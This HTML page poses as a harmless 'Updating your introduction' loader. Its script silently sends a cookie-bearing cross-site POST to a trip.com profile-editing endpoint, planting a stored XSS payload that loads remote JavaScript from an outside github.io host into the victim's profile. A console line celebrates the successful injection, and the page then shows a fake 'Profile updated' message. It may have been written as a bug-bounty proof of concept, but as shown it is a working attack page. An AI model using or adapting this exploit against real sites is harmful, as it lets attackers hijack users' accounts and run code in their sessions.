<!DOCTYPE html>
<html lang="en">
<head>
    <meta charset="UTF-8">
    <title>Updating Profile...</title>
    <style>
        body { font-family: Arial, sans-serif; text-align: center; padding: 80px 20px; background: #f8f9fa; }
        h2 { color: #0066cc; }
    </style>
</head>
<body>
    <h2>Updating your introduction...</h2>
    <p>Please wait a moment.</p>

    <script>
        const payload = {
            content: `<script src="https://ferhadfaal.github.io/CV/trip/xss.js"><\/script>`,
            head: {
                cver: "1.0",
                extension: [
                    { name: "locale", value: "en-US" },
                    { name: "platform", value: "Online" }
                ]
            }
        };

        fetch("https://us.trip.com/restapi/soa2/18066/editUserIntroduction", {
            method: "POST",
            headers: {
                "Content-Type": "text/plain",
                "Accept": "application/json",
                "Origin": "https://us.trip.com",
                "Referer": "https://us.trip.com/"
            },
            credentials: "include",   // مهم: کوکی‌های جلسه ارسال شود
            body: JSON.stringify(payload)
        })
        .then(r => r.json())
        .then(data => {
            console.log("%c✅ Stored XSS payload successfully injected into user profile", "color:green;font-size:16px");
            document.body.innerHTML = `<h2 style="color:green">Profile updated successfully!</h2>`;
        })
        .catch(err => console.error("Error:", err));
    </script>
</body>
</html>
